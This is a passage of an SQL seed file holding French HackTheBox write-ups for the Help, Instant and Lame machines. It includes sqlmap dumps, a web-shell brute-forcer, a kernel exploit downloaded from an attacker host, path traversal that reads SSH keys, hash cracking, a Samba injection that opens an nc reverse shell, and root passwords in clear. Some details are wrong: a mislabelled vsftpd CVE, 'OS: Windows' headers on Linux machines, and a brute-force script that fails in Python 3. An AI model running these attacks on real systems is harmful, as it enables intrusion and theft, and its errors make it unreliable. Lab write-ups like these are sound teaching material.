> **Schéma Mental :**
> L''application valide l''existence de la pièce jointe via une requête SQL. En injectant des conditions logiques (`AND 1=1` vs `AND 1=2`), la réponse serveur diffère (téléchargement réussi vs message "Whoops!"). On utilise cette divergence pour exfiltrer la base de données caractère par caractère.

**Exploitation avec sqlmap :**
```bash
# Extraction des hashes de la table staff
sqlmap -r ticket.req --level 5 --risk 3 -p "param[]" --dbms=mysql --dump -T staff
```
Le dump révèle le hash de l''administrateur : `d318f44739dced66793b1a603028133a76ae680e` (**Welcome1**). Ce mot de passe permet une connexion **SSH** directe avec l''utilisateur `help`.

#### Option B : Unauthenticated Arbitrary File Upload (Alternative)
L''application souffre d''une faille de conception : lors de l''upload d''une pièce jointe, le fichier est déplacé dans le répertoire temporaire avant la vérification de l''extension. Si l''extension est interdite (ex: `.php`), l''application renvoie une erreur mais **ne supprime pas le fichier**.

Le challenge réside dans la prédiction du nom de fichier, généré via : `md5(filename + time())`.

> **Schéma Mental :**
> 1. Upload d''un **Web Shell** (`cmd.php`).
> 2. Récupération de la date du serveur via les HTTP Headers.
> 3. Brute-force du hash MD5 en itérant sur les timestamps probables autour de l''heure d''upload.

**Script de Brute-force (Python) :**
```python
import hashlib, requests, time

base_url = "http://10.10.10.121/support/uploads/tickets/"
filename = "cmd.php"
current_time = int(time.time()) # Ajuster selon le décalage serveur

for i in range(0, 1200): # Fenêtre de 20 minutes
    hash = hashlib.md5(filename + str(current_time - i)).hexdigest()
    url = f"{base_url}{hash}.php"
    if requests.head(url).status_code == 200:
        print(f"Found: {url}")
        break
```

### Énumération Interne & Post-Exploitation

Une fois le shell obtenu (via **SSH** ou **Web Shell**), l''énumération du système révèle un noyau **Linux** daté.

**System Info :**
```bash
help@help:~$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
```

### Escalade de Privilèges : Kernel Exploitation

La version du noyau (4.4.0-116) sur **Ubuntu 16.04** est vulnérable à plusieurs exploits de type **Local Privilege Escalation (LPE)**, notamment ceux liés au sous-système **eBPF**.

#### Exploitation de CVE-2017-16995
Cette vulnérabilité permet à un utilisateur non privilégié d''exécuter du code arbitraire dans le contexte du noyau en raison d''une mauvaise vérification des instructions **eBPF**.

> **Schéma Mental :**
> L''exploit utilise le vérificateur eBPF pour charger un programme malveillant qui va écraser les structures de données `cred` du processus courant en mémoire kernel, positionnant les UID/GID à 0 (root).

**Chain d''exécution :**
```bash
# Transfert de l''exploit (44298.c)
wget http://<attacker_ip>/44298.c -O /dev/shm/exploit.c

# Compilation locale
gcc /dev/shm/exploit.c -o /dev/shm/exploit

# Exécution
/dev/shm/exploit
id # uid=0(root) gid=0(root)
```

**Alternative (CVE-2017-5899) :**
Si eBPF est restreint, l''exploit lié à `s-nail-privsep` peut être utilisé pour exploiter une **Race Condition** et obtenir un lien symbolique vers des fichiers sensibles ou un binaire **SUID**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial établi en tant qu''utilisateur **help**, mon objectif est d''identifier une faiblesse structurelle ou logicielle permettant d''obtenir les privilèges **root**. L''énumération système est ici cruciale.

#### Énumération du Système

Je commence par vérifier la version du **Kernel** et la distribution spécifique pour identifier des vulnérabilités connues de type **Local Privilege Escalation (LPE)**.

```bash
# Identification de la version du Kernel et de l''OS
uname -a
cat /etc/lsb-release
```

Le système tourne sous **Ubuntu 16.04.5 LTS** avec un **Kernel 4.4.0-116-generic**. Cette version spécifique est notoirement vulnérable à plusieurs failles critiques de corruption de mémoire au niveau du noyau, notamment celles liées au sous-système **eBPF** (extended Berkeley Packet Filter).

#### Exploitation du Kernel (Vecteur Final)

Après recherche, le vecteur le plus fiable pour cette version de noyau est l''exploitation de la vulnérabilité **CVE-2017-16995**. Cette faille réside dans le vérificateur **eBPF** qui ne contrôle pas correctement les registres 64 bits, permettant à un utilisateur non privilégié d''exécuter du code arbitraire dans l''espace noyau.

> **Schéma Mental :**
> 1. **Identification :** Le Kernel est ancien (2018) et non patché.
> 2. **Cible :** Le vérificateur eBPF (chargé de valider la sécurité du code envoyé au kernel).
> 3. **Exploitation :** Utiliser un exploit C qui abuse d''une confusion de type pour obtenir des capacités de lecture/écriture (R/W) arbitraires dans la mémoire du noyau.
> 4. **Payload :** Modifier la structure `cred` du processus courant pour passer les UID/GID à 0 (**root**).

J''utilise l''exploit public `44298.c` (ou sa variante `45010.c`). Je transfère le code source sur la machine cible via un serveur HTTP temporaire, puis je le compile localement.

```bash
# Sur la machine d''attaque
python3 -m http.server 80

# Sur la machine cible (dans /dev/shm pour la discrétion)
cd /dev/shm
wget http://10.10.14.4/44298.c
gcc -o exploit 44298.c
chmod +x exploit
./exploit
```

L''exécution réussit, le pointeur `uidptr` est localisé et écrasé, me donnant un shell avec les privilèges maximaux.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

---

### Analyse Post-Exploitation : Beyond Root

L''analyse de la machine **Help** révèle une posture de sécurité fragile, typique des environnements dont la maintenance a été délaissée.

**1. La problématique du Patch Management :**
La compromission totale a été facilitée par un **Kernel** obsolète. Dans un environnement de production, l''utilisation de solutions comme **Livepatch** (sur Ubuntu) permet d''appliquer des correctifs de sécurité critiques au noyau sans redémarrage, ce qui aurait neutralisé les exploits **CVE-2017-16995** et **CVE-2017-5899**.

**2. Vulnérabilité de l''application HelpDeskZ :**
L''accès initial via l''**Arbitrary File Upload** (ou la **SQLi**) démontre une absence de validation rigoureuse des entrées. Le mécanisme de renommage des fichiers basé sur `md5(time())` est une forme de **Security through obscurity** totalement inefficace face à une attaque par force brute temporelle. Une implémentation sécurisée utiliserait des **UUID** cryptographiquement sécurisés et stockerait les fichiers hors du **Document Root**.

**3. Exposition de l''API GraphQL :**
L''**Introspection** était activée sur le point de terminaison **GraphQL** (port 3000). Cela a permis une énumération complète du schéma de la base de données, révélant des champs sensibles (`password`). En production, l''introspection doit être désactivée et les requêtes doivent être limitées par des **Depth Limits** pour éviter les dénis de service ou l''exfiltration massive de données.

**4. Hygiène des mots de passe :**
Le hash récupéré via **SQLi** a été cassé instantanément ("Welcome1"). Cela souligne l''importance de politiques de mots de passe robustes et de l''utilisation d''algorithmes de hachage modernes avec sel (comme **Argon2** ou **bcrypt**) au lieu de simples MD5 ou SHA1.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'Ma méthodologie commence par un scan **Nmap** complet pour identifier la surface d''attaque. La machine présente trois ports ouverts, suggérant un vecteur d''entrée via des services web. **Résultats :** * **Port 22 (SSH) :** OpenSSH 7.2p2 (Ubuntu). * *...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-help-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Instant
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Instant',
  'htb-instant',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

# Phase 1 : Reconnaissance & Brèche Initiale

## Énumération des services (Scanning)

Ma méthodologie débute par un scan **Nmap** complet pour identifier la surface d''attaque réseau.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.37

# Scan de services et scripts par défaut sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.37
```

Le scan révèle deux ports ouverts :
*   **22/tcp (SSH)** : OpenSSH 9.6p1.
*   **80/tcp (HTTP)** : Apache 2.4.58, redirigeant vers `http://instant.htb/`.

J''ajoute l''entrée correspondante dans mon fichier `/etc/hosts` :
```text
10.10.11.37 instant.htb
```

## Analyse de l''application Web et de l''APK

Le site `instant.htb` présente une application de change de monnaie. L''élément le plus critique identifié est un lien de téléchargement pour un fichier Android nommé **instant.apk**. 

### Reverse Engineering de l''APK
J''utilise **jadx-gui** pour décompiler et analyser le code source de l''application. Une recherche de chaînes de caractères (**String Search**) pour "instant.htb" révèle de nouveaux sous-domaines :
*   `mywalletv1.instant.htb` (API principale)
*   `swagger-ui.instant.htb` (Documentation API)

Je mets à jour mon fichier `/etc/hosts` :
```text
10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb
```

### Découverte du Hardcoded JWT
En inspectant la classe `com.instantlabs.instant.AdminActivities`, je découvre une fonction `TestAdminAuthorization` contenant un **JSON Web Token (JWT)** codé en dur :

```java
// Token Admin extrait du code source
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

L''analyse sur `jwt.io` confirme que ce token possède le rôle **Admin** et une date d''expiration extrêmement lointaine (année 3023).

## Analyse de l''API et Identification de la Vulnérabilité

Je me dirige vers `http://swagger-ui.instant.htb` pour explorer les points de terminaison de l''API. L''interface **Swagger UI** me permet de tester les requêtes en utilisant le token admin dans le header `Authorization`.

L''endpoint `/api/v1/admin/view/logs` renvoie un fichier nommé `1.log` situé dans le répertoire personnel de l''utilisateur **shirohige**.

> Schéma Mental :
> APK Analysis -> Hardcoded Admin JWT -> Swagger UI Access -> Admin API Endpoints -> Log Reading Function -> Potential Path Traversal.

### Exploitation du Path Traversal / Arbitrary File Read
Le point de terminaison `/api/v1/admin/read/log` prend un paramètre de nom de fichier. Je teste une injection de type **Directory Traversal** pour lire des fichiers sensibles.

```bash
# Vérification de la vulnérabilité via curl
curl -X ''GET'' ''http://mywalletv1.instant.htb/api/v1/admin/read/log?file=../../../../etc/passwd'' \
-H ''Authorization: <JWT_TOKEN>''
```

Le serveur est vulnérable et retourne le contenu de `/etc/passwd`. Je confirme la présence de l''utilisateur **shirohige**.

## Premier Shell : Accès SSH

Puisque l''application semble s''exécuter dans le contexte de l''utilisateur **shirohige**, je tente de lire sa clé privée SSH.

```bash
# Lecture de la clé SSH privée
curl -X ''GET'' ''http://mywalletv1.instant.htb/api/v1/admin/read/log?file=../../../../home/shirohige/.ssh/id_rsa'' \
-H ''Authorization: <JWT_TOKEN>''
```

L''API retourne la clé sous forme de liste JSON. Je la reformate proprement dans un fichier local.

```bash
# Nettoyage et configuration de la clé
nano id_rsa_shirohige
chmod 600 id_rsa_shirohige

# Connexion SSH
ssh -i id_rsa_shirohige shirohige@instant.htb
```

Je parviens à obtenir un shell stable en tant que **shirohige** et je peux lire le premier flag dans `user.txt`.

---

### Énumération Interne & Post-Exploitation

Une fois l''accès initial établi en tant que **shirohige** via **SSH**, j''entame une énumération locale pour identifier des vecteurs d''escalade. Le système est un **Ubuntu 24.04**.

L''exploration du répertoire personnel et des fichiers système révèle deux éléments critiques :
1.  **Base de données SQLite** : Située dans `~/projects/mywallet/Instant-Api/mywallet/instance/instant.db`. Elle contient les informations des utilisateurs de l''application.
2.  **Fichier de sauvegarde Solar-PuTTY** : Situé dans `/opt/backups/Solar-PuTTY/sessions-backup.dat`. **Solar-PuTTY** est un gestionnaire de sessions Windows dont les fichiers de configuration peuvent contenir des identifiants chiffrés.

```bash
# Extraction de la base de données pour analyse locale
scp -i id_rsa shirohige@instant.htb:~/projects/mywallet/Instant-Api/mywallet/instance/instant.db .

# Identification du fichier de backup Solar-PuTTY
ls -l /opt/backups/Solar-PuTTY/sessions-backup.dat
```

---

### Analyse de la base de données & Extraction de Hashes

L''ouverture de `instant.db` avec **sqlite3** permet d''isoler la table `wallet_users`. Celle-ci contient des **PBKDF2 hashes** générés par le framework **Werkzeug** (Python).

```sql
-- Exploration des utilisateurs
sqlite3 instant.db
sqlite> .tables
sqlite> SELECT username, password FROM wallet_users;

-- Résultat :
-- shirohige | pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed
```

> **Schéma Mental : Pivot de mot de passe**
> L''objectif est de casser le hash de l''utilisateur actuel (`shirohige`). En cybersécurité, la réutilisation de mots de passe est fréquente. Si le mot de passe de l''utilisateur est "faible", il pourrait servir de clé de déchiffrement pour le fichier **Solar-PuTTY** trouvé précédemment.

---

### Escalade de Privilèges : Du User au Root

#### 1. Cracking du Hash Werkzeug
Le format de hash **Werkzeug** (`pbkdf2:sha256:iterations$salt$hash`) n''est pas nativement supporté par **Hashcat**. Il nécessite une conversion vers le format **PBKDF2-HMAC-SHA256** (Mode 10900).

```python
# Script de conversion rapide (Werkzeug -> Hashcat)
import base64, codecs
# Format : sha256:iterations:base64(salt):base64(binascii.unhexlify(hash))
print(f"sha256:600000:{base64.b64encode(b''YnRgjnim'').decode()}:{base64.b64encode(codecs.decode(''c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed'', ''hex'')).decode()}")
```

L''exécution de **Hashcat** sur le hash converti avec la liste **rockyou.txt** révèle le mot de passe : `estrella`.

```bash
hashcat -m 10900 converted_hash.txt /usr/share/wordlists/rockyou.txt
```

#### 2. Déchiffrement de Solar-PuTTY
Le fichier `sessions-backup.dat` est chiffré. En utilisant le mot de passe `estrella` comme clé, je peux extraire les sessions enregistrées. J''utilise l''outil **SolarPuttyCracker** (ou **SolarPuttyDecrypt** via **Mono**).

> **Schéma Mental : Extraction de secrets**
> Le fichier de backup contient un objet JSON chiffré. Une fois la clé trouvée, le déchiffrement expose les attributs `Username` et `Password` des sessions SSH enregistrées par l''administrateur.

```bash
# Utilisation de SolarPuttyCracker
python3 SolarPuttyCracker.py sessions-backup.dat -p estrella
```

Le résultat affiche une entrée pour l''utilisateur **root** :
*   **Username** : `root`
*   **Password** : `12**24nzC!r0c%q12`

#### 3. Accès Root Final
Bien que l''accès direct en **SSH** pour **root** soit généralement désactivé (`PermitRootLogin no`), le mot de passe permet de s''authentifier via la commande `su` depuis la session `shirohige`.

```bash
shirohige@instant:~$ su -
Password: 12**24nzC!r0c%q12
root@instant:~# id
uid=0(root) gid=0(root) groups=0(root)
```

L''escalade est complète. Le vecteur final reposait sur une **Credential Reuse** (réutilisation de mot de passe) entre l''application web et la protection d''un fichier de configuration tiers.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le shell obtenu en tant que **shirohige**, j''entame une phase d''énumération locale approfondie pour identifier des vecteurs d''escalade. Le système tourne sous **Ubuntu 24.04**, une version récente qui limite les exploits de noyau classiques.

#### Énumération du Système de Fichiers & Bases de Données
Dans le répertoire personnel de l''utilisateur, je localise le code source de l''API **Flask**. En explorant le dossier `instance/`, je découvre une base de données **SQLite** nommée `instant.db`.

```bash
# Extraction de la base de données pour analyse locale
scp -i id_rsa shirohige@instant.htb:~/projects/mywallet/Instant-Api/mywallet/instance/instant.db .

# Analyse des tables et des hashes
sqlite3 instant.db "SELECT username, password FROM wallet_users;"
```

La table `wallet_users` contient des hashes générés par le framework **Werkzeug** (`pbkdf2:sha256:600000$...`). Je note également la présence d''un fichier inhabituel dans `/opt` : `/opt/backups/Solar-PuTTY/sessions-backup.dat`.

> **Schéma Mental :**
> L''attaque repose sur une corrélation de données : 
> 1. Extraire les hashes de l''application web.
> 2. Casser le hash de l''utilisateur actuel (**shirohige**).
> 3. Utiliser ce mot de passe comme clé de déchiffrement pour un backup **Solar-PuTTY** trouvé sur le disque, lequel contient probablement les identifiants **Root**.

#### Crack des identifiants Werkzeug
Le format de hash de **Werkzeug** n''est pas nativement supporté par **Hashcat** dans sa forme brute. Il nécessite une conversion vers le mode `10900` (**PBKDF2-HMAC-SHA256**).

```python
# Script de conversion Werkzeug vers Hashcat (format sha256:iterations:salt:pass)
import base64, codecs, re

h = "pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed"
m = re.match(r''pbkdf2:sha256:(\d*)\$([^\$]*)\$(.*)'', h)
print(f"sha256:{m.group(1)}:{base64.b64encode(m.group(2).encode()).decode()}:{base64.b64encode(codecs.decode(m.group(3), ''hex'')).decode()}")
```

Après conversion, je lance **Hashcat** avec la liste **rockyou.txt** :
```bash
hashcat -m 10900 hash_converted.txt /usr/share/wordlists/rockyou.txt
```
Le mot de passe de **shirohige** est identifié : `estrella`.

#### Déchiffrement de Solar-PuTTY
**Solar-PuTTY** est un gestionnaire de sessions tiers. Ses fichiers de configuration et de backup sont chiffrés, mais des recherches (notamment les travaux de **VoidSec**) montrent que si un mot de passe utilisateur est réutilisé pour protéger la base de données des sessions, celle-ci peut être déchiffrée.

J''utilise l''outil **SolarPuttyCracker** (ou le binaire C# original via **Mono**) pour extraire les secrets du fichier `.dat`.

```bash
# Déchiffrement du fichier de session avec le mot de passe trouvé
python3 SolarPuttyCracker.py sessions-backup.dat -p estrella
```

L''outil extrait un objet JSON contenant les **Credentials** de la session nommée "Instant". Je récupère le mot de passe en clair pour l''utilisateur **root** : `12**24nzC!r0c%q12`.

#### Compromission Totale
Le service **SSH** restreint généralement l''accès direct à **root**. J''utilise donc `su` depuis ma session actuelle.

```bash
shirohige@instant:~$ su -
Password: 12**24nzC!r0c%q12
root@instant:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Analyse Post-Exploitation "Beyond Root"

L''analyse de la machine **Instant** révèle plusieurs failles structurelles graves dans la gestion des secrets et le cycle de vie du développement (SDLC) :

1.  **Hardcoded Credentials dans l''APK** : La présence d''un **Admin JWT** avec une date d''expiration fixée à l''an 3023 dans le code source de l''application Android est une erreur critique. Cela démontre une absence de rotation des secrets et une confiance aveugle dans l''obfuscation du code client.
2.  **LFI via l''API d''administration** : L''endpoint `/api/v1/admin/read/log` souffrait d''une vulnérabilité de **Path Traversal**. L''absence de **Sandboxing** ou de **Chroot** pour le processus de l''API a permis de lire des fichiers sensibles comme `id_rsa`.
3.  **Credential Reuse & Insecure Backups** : Le vecteur final d''élévation de privilèges repose sur la réutilisation du mot de passe de l''application web pour protéger un fichier de backup tiers (**Solar-PuTTY**). De plus, stocker des fichiers de sessions contenant des mots de passe **root** dans un répertoire lisible par tous (`/opt/backups/`) est une violation flagrante du principe de moindre privilège.
4.  **Werkzeug Security** : Bien que les hashes **Werkzeug** soient robustes (PBKDF2), la faiblesse du mot de passe choisi (`estrella`) a permis un cassage hors-ligne rapide une fois la base **SQLite** exfiltrée.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'Ma méthodologie débute par un scan **Nmap** complet pour identifier la surface d''attaque réseau. Le scan révèle deux ports ouverts : * **22/tcp (SSH)** : OpenSSH 9.6p1. * **80/tcp (HTTP)** : Apache 2.4.58, redirigeant vers `http://instant.htb/`. J''aj...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-instant-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Lame
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Lame',
  'htb-lame',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Reconnaissance & Scanning

Ma méthodologie débute par une phase de **Port Scanning** agressive pour identifier la surface d''attaque. J''utilise **nmap** avec une vitesse d''émission élevée pour un premier tri, suivi d''un scan de services détaillé.

```bash
# Scan TCP complet (tous les ports)
nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.3

# Scan de services et scripts par défaut sur les ports identifiés
nmap -p 21,22,139,445,3632 -sV -sC -oA scans/tcpscripts 10.10.10.3
```

**Résultats du scan :**
*   **Port 21 (FTP) :** **vsftpd 2.3.4**. L''accès **Anonymous FTP login** est autorisé.
*   **Port 22 (SSH) :** **OpenSSH 4.7p1**. Version très ancienne (Ubuntu 8.04), suggérant un système obsolète.
*   **Ports 139/445 (SMB) :** **Samba 3.0.20-Debian**.
*   **Port 3632 (distccd) :** **distccd v1**.

---

### 2. Énumération des Services

#### FTP (vsftpd 2.3.4)
Le service **vsftpd 2.3.4** est célèbre pour une **Backdoor** introduite dans son code source (CVE-2011-0762). Elle se déclenche en envoyant un **username** se terminant par `:)`. 

> **Schéma Mental :**
> L''attaquant envoie `USER user:)` -> Le service ouvre un **Bind Shell** sur le port **6200/TCP**. 
> *Problème ici :* Bien que le service soit vulnérable, le port 6200 semble filtré par un firewall ou non exposé, rendant l''exploitation directe impossible depuis l''extérieur.

#### SMB (Samba 3.0.20)
J''utilise **smbmap** pour lister les partages accessibles sans authentification.

```bash
smbmap -H 10.10.10.3
```

Le partage `/tmp` est accessible en **READ/WRITE**. Cependant, la version de **Samba (3.0.20)** attire immédiatement mon attention. Elle est sujette à la vulnérabilité **Username Map Script** (**CVE-2007-2447**).

---

### 3. Analyse de la Vulnérabilité : CVE-2007-2447

La vulnérabilité réside dans la configuration non sécurisée de l''option `username map script`. Samba permet de passer le nom d''utilisateur à un script externe avant l''authentification. Si les métacaractères du shell ne sont pas filtrés, il est possible d''injecter des commandes arbitraires.

> **Schéma Mental :**
> Requête SMB de session -> Champ `username` contient des backticks ou une substitution de commande : `"/=`nohup [command]`"` -> Le démon Samba exécute la commande avec les privilèges du service (souvent **root**).

---

### 4. Exploitation & Initial Access

#### Méthode Manuelle (smbclient)
Pour exploiter cela manuellement, je dois forcer l''utilisation du protocole **NT1** (ancien SMB) car les clients modernes le désactivent par sécurité. J''utilise la commande `logon` à l''intérieur de **smbclient** pour injecter mon **Reverse Shell**.

```bash
# Préparation du listener
nc -lnvp 443

# Injection via smbclient
smbclient //10.10.10.3/tmp --option=''client min protocol=NT1''
# Une fois connecté :
logon "/=`nohup nc -e /bin/sh 10.10.14.24 443`"
```

#### Méthode via Metasploit
Le module `exploit/multi/samba/usermap_script` automatise parfaitement ce vecteur.

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
set LPORT 443
set PAYLOAD cmd/unix/reverse
exploit
```

**Résultat :** J''obtiens une session avec les privilèges **root** immédiatement, car le service Samba tourne avec les droits les plus élevés sur cette version d''Ubuntu.

```bash
id
uid=0(root) gid=0(root)
```

#### Stabilisation du Shell
Pour obtenir un shell interactif propre, j''utilise **Python** pour spawn un **PTY**.

```bash
python -c ''import pty; pty.spawn("bash")''
```

---

### Post-Exploitation & Shell Stabilization

Une fois l''accès initial obtenu via l''exploitation du service **Samba**, je me retrouve avec un shell rudimentaire. La première étape consiste à stabiliser ce shell pour obtenir un terminal interactif complet (**TTY**), ce qui est indispensable pour manipuler les éditeurs de texte ou gérer les signaux (comme `Ctrl+C`).

```bash
# Stabilisation du shell via Python
python -c ''import pty; pty.spawn("/bin/bash")''

# Exportation des variables d''environnement pour le confort
export TERM=xterm
```

### Énumération Interne (Post-Exploitation)

Bien que l''exploit **Samba usermap script** nous donne directement un accès **root**, il est crucial de comprendre l''environnement interne pour identifier d''éventuels pivots ou vecteurs de persistance. L''énumération des services en écoute locale révèle une surface d''attaque bien plus vaste que celle visible de l''extérieur.

```bash
# Identification des services en écoute (TCP)
netstat -tnlp

# Vérification des privilèges actuels
id
uid=0(root) gid=0(root)
```

L''analyse de `netstat` montre que de nombreux services (MySQL sur le port 3306, PostgreSQL sur le 5432, Apache sur le 80) sont actifs mais filtrés par un **Firewall** (probablement **iptables**). Cela explique pourquoi le scan **Nmap** initial était limité.

> **Schéma Mental :**
> **Recon Externe** (Ports limités par Firewall) -> **Exploitation** (Samba) -> **Recon Interne** (Services locaux non filtrés) -> **Analyse de Surface** (Identification des vecteurs de mouvement latéral potentiels).

### Analyse du Mouvement Latéral : Le cas VSFTPD

L''énumération interne permet de résoudre le mystère de l''échec de l''exploit **vsftpd 2.3.4 Backdoor**. Bien que la vulnérabilité soit présente, la connexion au shell de secours (port 6200) échoue systématiquement depuis l''extérieur.

En testant localement après avoir compromis la machine, je confirme la présence de la **Backdoor** :

```bash
# Tentative de déclenchement du backdoor localement
nc -nv 127.0.0.1 21
USER 0xdf:)
PASS password

# Vérification de l''ouverture du port 6200
netstat -tnlp | grep 6200
tcp 0 0 0.0.0.0:6200 0.0.0.0:* LISTEN 5580/vsftpd

# Connexion locale au shell root via le backdoor
nc 127.0.0.1 6200
id
uid=0(root) gid=0(root)
```

**Logique technique :** Le **Firewall** de la machine autorise le trafic entrant sur le port 21 (FTP), permettant ainsi d''envoyer le "trigger" (le smiley `:)` dans le username). Cependant, il bloque tout trafic entrant non sollicité sur le port 6200. Le mouvement latéral ou l''escalade via ce vecteur n''est donc possible que si l''on se trouve déjà sur le réseau local ou si l''on dispose d''un accès local.

### Escalade de Privilèges & Persistence

Sur cette machine spécifique, l''exploitation de **Samba** (CVE-2007-2447) court-circuite la phase habituelle d''escalade de privilèges (User -> Root) car le démon `smbd` tourne avec les droits **root**. 

```bash
# Recherche de fichiers sensibles pour la persistance ou le pivot
find / -name "user.txt" -o -name "root.txt" 2>/dev/null
cat /home/makis/user.txt
cat /root/root.txt
```

> **Schéma Mental (Samba Usermap Script) :**
> 1. **Input :** Username contenant des métacaractères shell (ex: `` `nohup payload` ``).
> 2. **Vulnerability :** Samba passe cette chaîne directement à un script de mapping sans sanitization.
> 3. **Execution :** Le shell exécute la commande encapsulée avec les privilèges du processus Samba (**root**).
> 4. **Result :** Remote Code Execution (RCE) immédiat en tant que super-utilisateur.

### Extraction des Flags

L''accès **root** étant confirmé, l''extraction des preuves se fait via une recherche simple dans les répertoires personnels.

```bash
# Extraction rapide des flags
find /home -name user.txt -exec cat {} \;
cat /root/root.txt
```

---

### Vecteur d''Exploitation : Samba "Username Map Script" (CVE-2007-2447)

L''analyse des services révèle une version de **Samba (3.0.20)** vulnérable à une injection de commande distante. Cette vulnérabilité, identifiée sous le code **CVE-2007-2447**, réside dans l''option de configuration non sécurisée `username map script`. Lorsqu''un utilisateur tente de s''authentifier, le nom d''utilisateur fourni est passé à un script externe sans filtrage adéquat des métacaractères du shell.

Puisque le démon **smbd** s''exécute avec les privilèges **root** pour gérer les accès aux fichiers, toute commande injectée via le champ "username" sera exécutée avec les droits les plus élevés du système.

> **Schéma Mental : Injection de Commande via SMB**
> 1. **Requête de Session** : L''attaquant initie une demande de connexion SMB (**Session Setup**).
> 2. **Payload Injection** : Le champ `username` contient des backticks (`` ` ``) ou une substitution de commande `$()`.
> 3. **Exécution Côté Serveur** : Samba appelle le script de mapping : `/bin/sh -c "/path/to/script [username]"`.
> 4. **Command Execution** : Le shell interprète le contenu des backticks comme une commande système.
> 5. **Privilege Escalation** : La commande s''exécute sous le contexte de l''utilisateur **root**.

#### Exploitation Manuelle (smbclient)

Je privilégie l''utilisation de **smbclient** pour déclencher la vulnérabilité sans dépendre de Metasploit. L''astuce consiste à utiliser la commande `logon` une fois connecté anonymement à un partage (comme `/tmp`).

```bash
# Configuration du listener
nc -lnvp 443

# Connexion au partage et injection du Reverse Shell
smbclient //10.10.10.3/tmp --option=''client min protocol=NT1''
smb: \> logon "/=`nohup nc -e /bin/sh 10.10.14.24 443`"
# Note : Le mot de passe peut être laissé vide.
```

#### Exploitation via Script Python (POC)

Il est également possible d''automatiser l''envoi du **Payload** via un script Python utilisant la bibliothèque `pysmb`.

```python
# Structure simplifiée du payload dans le script
username = "/=`nohup nc -e /bin/sh 10.10.14.24 443`"
conn = SMBConnection(username, "", "client", "server", use_ntlmv2=False)
conn.connect(target_ip, 139)
```

### Post-Exploitation & Domination

Une fois le **Reverse Shell** obtenu, je stabilise le terminal pour obtenir un shell interactif complet (**PTY**).

```bash
python -c ''import pty; pty.spawn("/bin/bash")''
# CTRL+Z, stty raw -echo; fg, reset
```

L''accès est immédiatement **root**, ce qui permet de récupérer les flags sans étape supplémentaire d''élévation de privilèges locale.

```bash
id
# uid=0(root) gid=0(root)

cat /root/root.txt
cat /home/makis/user.txt
```

---

### Analyse "Beyond Root"

L''analyse post-compromission permet de comprendre pourquoi certains vecteurs ont échoué malgré la présence de services vulnérables.

#### Le cas vsFTPd 2.3.4
La machine expose un service **vsFTPd 2.3.4**, célèbre pour sa **Backdoor** (déclenchée par un smiley `:)` dans le nom d''utilisateur). Bien que j''aie pu déclencher l''ouverture du port **6200** sur la machine cible, la connexion a échoué.

**Analyse du Pare-feu :**
En inspectant les règles de filtrage locales ou en comparant les services internes avec le scan externe, on constate que le port **6200** est bloqué par une règle de **Firewall** (type IPTables).

```bash
# Vérification locale de l''ouverture du port après trigger
netstat -tnlp | grep 6200
# tcp 0 0 0.0.0.0:6200 0.0.0.0:* LISTEN 5580/vsftpd
```
Le port est bien en écoute sur `0.0.0.0`, mais les paquets entrants provenant de l''interface `eth0` (réseau HTB) sont rejetés. Seule une connexion locale (**Localhost**) permettrait d''accéder au shell via cette backdoor.

#### Services Internes Masqués
Le scan **Nmap** initial ne montrait que 5 ports. Une fois **root**, l''examen de `netstat` révèle une surface d''attaque interne bien plus vaste :
*   **NFS** (2049)
*   **MySQL** (3306)
*   **PostgreSQL** (5432)
*   **UnrealIRCd** (6667)
